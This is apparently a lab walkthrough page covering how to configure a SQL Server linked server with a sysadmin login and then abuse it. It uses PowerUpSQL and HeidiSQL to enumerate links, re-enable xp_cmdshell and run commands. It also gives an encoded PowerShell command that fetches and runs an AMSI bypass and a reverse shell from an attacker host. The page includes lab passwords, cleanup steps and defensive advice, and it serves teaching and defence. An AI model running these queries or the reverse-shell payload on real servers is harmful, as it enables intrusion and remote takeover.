---
description: SQL Servers can be configured to link to other SQL Servers.
---

# Database-Links

## Configuring

### Prerequisite

{% content-ref url="initial-access/normal-domain-user-access.md" %}
[normal-domain-user-access.md](initial-access/normal-domain-user-access.md)
{% endcontent-ref %}

### Configuring SQL user on Data01

1. Login to `DATA01` as the `Administrator` user with password `Welcome01!`.
2. Open "Microsoft SQL Server Management Studio".

![](<../../../.gitbook/assets/image (17) (1) (1) (1) (1) (1) (1).png>)

3\.  Login with the `Administrator` user using Windows Authentication.

![](<../../../.gitbook/assets/image (29) (1) (1) (1) (1).png>)

4\. Right click on the server object "Data01\Data (SQL Server 15.0.2000.5)" and select "Properties".

5\. Open the "Security" tab and select "SQL Server and Windows Authentication mode" under "Server authentication".

![](<../../../.gitbook/assets/image (52) (1) (1) (1) (1).png>)

6\. Open "SQL Server 2019 Configuration Manager"&#x20;

![](<../../../.gitbook/assets/image (6) (1) (1) (1).png>)

7\. Restart the two SQL services with "DATA" in their name.

![](<../../../.gitbook/assets/image (32) (1) (1) (1).png>)

8\. Open "Microsoft SQL Server Management Studio".

9\. Expand "Security" and "Logins". Then right click on "Logins" and select "New Login".

10\. Fill in the login name `SQL_link` and password `Eo6#jAzonQhw` . Then make sure the three password flags "Enforce Password policy", "Enforce password expiration" and "User must change password at next login" are unselected.

![](<../../../.gitbook/assets/image (65) (1) (1) (1) (1).png>)

11\. In the tab "Server Roles" select "setupadmin" and "sysadmin" and click "OK".

![](<../../../.gitbook/assets/image (52) (1) (1) (1).png>)

12\. In the tab "User Mapping" select "Bank Transfers".

![](<../../../.gitbook/assets/image (27) (1) (1).png>)

### Configuring SQL link

1. Login to `WEB01` as the `Administrator` user with password `Welcome01!`.
2. Open "Microsoft SQL Server Management Studio".
3. Login with the `Administrator` user using Windows Authentication.
4. Expand the "Server Objects" and "Linked Servers". Then right click on "Linked Servers" and select "New Linked Server".
5. Fill in `Data01.secure.local` and select "SQL Server".

![](<../../../.gitbook/assets/image (10) (1) (2).png>)

6\. Open the "Security" tab and select "Be made using this security context". Then fill in the credentials we created in the previous section. `SQL_link` and password `Eo6#jAzonQhw` .&#x20;

![](<../../../.gitbook/assets/image (68) (1) (1) (1).png>)

7\. Open the "Server Options" tab and select True for "RPC Out". This is done so we can enable xp\_cmdshell during the attack.

![](<../../../.gitbook/assets/image (14) (1) (1) (1) (1).png>)

{% hint style="info" %}
Step 7 could be skipped and then it could be enabled during the attack after getting sa privileges on Web01 database using the following query:

`EXEC sp_serveroption @server='DATA01.SECURE.LOCAL', @optname='rpc out', @optvalue='True'`
{% endhint %}

8\. Click "OK" and the linked server should show up.

![](<../../../.gitbook/assets/image (64) (1) (1) (1) (1) (1).png>)

## Attacking

### How it works

SQL Servers can be linked together to access data on the linked SQL Server. The link is created using a security context, this could be a SQL user or a domain user. The link will have the permissions from the user. If the user has sysadmin privileges it is possible to execute queries as sysadmin.

If xp\_cmdshell is enabled on the linked server it is possible to execute commands. Or if RPCOUT is enabled it is possible to enable xp\_cmdshell.

### Tools

* [PowerupSQL](https://github.com/NetSPI/PowerUpSQL)
* [Heidisql](https://www.heidisql.com/)

### Executing the attack

1. Download PowerUpSQL on the kali machine and host it on a webserver:

```
wget https://raw.githubusercontent.com/NetSPI/PowerUpSQL/master/PowerUpSQL.ps1
python3 -m http.server 8090
```

2\. Login to `WS01` as Richard with the password `Sample123`.

3\. Start PowerShell and download and execute an amsi and PowerUpSQL in memory:

![](<../../../.gitbook/assets/afbeelding (20).png>)

3\. With PowerUPSQL and the `Get-SQLServerLink` cmdlet we can query the SQL Server links from the current domain.

```
Get-SQLInstanceDomain | Get-SQLServerLink.
```

![](<../../../.gitbook/assets/afbeelding (38).png>)

4\. The output shows that `web01.amsterdam.bank.local` has a SQL Server link to `DATA01.secure.local`.  A link that is to another domain. The output also shows that rpc\_out is enabled. With the cmdlet `Get-SQLServerLinkCrawl` we can execute a query through the linked servers.&#x20;

```
Get-SQLInstanceDomain | Get-SQLServerLinkCrawl -Query 'select @@version'
```

![](<../../../.gitbook/assets/afbeelding (17).png>)

We wont see the data from the SQL Query since its wrapped into the `CustomQuery` object. It is also queried to both SQL Servers.

5\. With the parameter `-QueryTarget` we can select a target instance to query.

```
Get-SQLInstanceDomain | Get-SQLServerLinkCrawl -Query 'select @@version' -QueryTarget DATA01\DATA | Select-Object -ExpandProperty CustomQuery
```

![](<../../../.gitbook/assets/afbeelding (49).png>)

#### Connecting with HeidiSQL

1. Download [HeidiSQL](https://www.heidisql.com/download.php?download=portable-64) on `WS01`.
2. To execute SQL queries and look into the database start heidiSQL.
3. Click on "New" on the left bottom and configure the following settings:

* Network Type: `Microsoft SQL Server (TCP/IP)`
* Library: `SQLOLEDB`
* Hostname / IP: `WEB01.amsterdam.bank.local`
* Select: "Use Windows Authentication"
* Port: `1433`

![](<../../../.gitbook/assets/afbeelding (29).png>)

4\. Click "OK" on the security Issue warning.

5\. In the "Query" tab fill in the following to query the SQL Links:

```
SELECT * FROM master..sysservers;
```

![](<../../../.gitbook/assets/afbeelding (26).png>)

6\. We discovered the same SQL server link as earlier. We can query the server with the following query:

```
SELECT * FROM OPENQUERY("DATA01.SECURE.LOCAL", 'select @@version');
```

![](<../../../.gitbook/assets/afbeelding (36).png>)

7\. We can query the server to check if `xp_cmdshell` is on:

```
SELECT * FROM OPENQUERY("DATA01.SECURE.LOCAL", 'SELECT * FROM sys.configurations WHERE name = ''xp_cmdshell''');
```

![](<../../../.gitbook/assets/afbeelding (19).png>)

8\. The value `0` means xp\_cmdshell is disabled. We can try to enable xp\_cmdshell with the following queries:

```
EXEC('sp_configure ''show advanced options'', 1; reconfigure;') AT "DATA01.SECURE.LOCAL"
EXEC('sp_configure ''xp_cmdshell'', 1; reconfigure;') AT "DATA01.SECURE.LOCAL"
```

9\. When we check if xp\_cmdshell is enabled we see it is enabled now.

![](<../../../.gitbook/assets/afbeelding (46).png>)

10\. We can execute commands using the EXECUTE function.

```
EXECUTE('exec master..xp_cmdshell ''whoami''') AT "DATA01.SECURE.LOCAL"
```

![](<../../../.gitbook/assets/afbeelding (44) (1).png>)

11\. We could get a reverse shell by executing the following query using the technique from:

{% content-ref url="../../misc/reverse-shell-trick.md" %}
[reverse-shell-trick.md](../../misc/reverse-shell-trick.md)
{% endcontent-ref %}

```
EXECUTE('exec master..xp_cmdshell ''powershell.exe -w hidden -enc aQBlAHgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADIANAA4AC4AMgA6ADgAMAA5ADAALwBhAG0AcwBpAC4AdAB4AHQAIgApADsAIABpAGUAeAAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMgA0ADgALgAyADoAOAAwADkAMAAvAEkAbgB2AG8AawBlAC0AUABvAHcAZQByAFMAaABlAGwAbABUAGMAcAAuAHAAcwAxACIAKQA=''') AT "DATA01.SECURE.LOCAL"
```

![](<../../../.gitbook/assets/afbeelding (44).png>)

### Cleanup

1. Execute the following query in HeidiSQL to disable xp\_cmdshell again:

```
EXEC('sp_configure ''xp_cmdshell'', 0; reconfigure;') AT "DATA01.SECURE.LOCAL"
EXEC('sp_configure ''show advanced options'', 0; reconfigure;') AT "DATA01.SECURE.LOCAL"
```

## Defending

### Recommendations

* Configure the SQL\_Link with the least privilege possible, dont use the sysadmin role.
* Disable xp\_cmdshell on the SQL Server.
* Disable RPC OUT on the SQL Server.

### Detection



## References
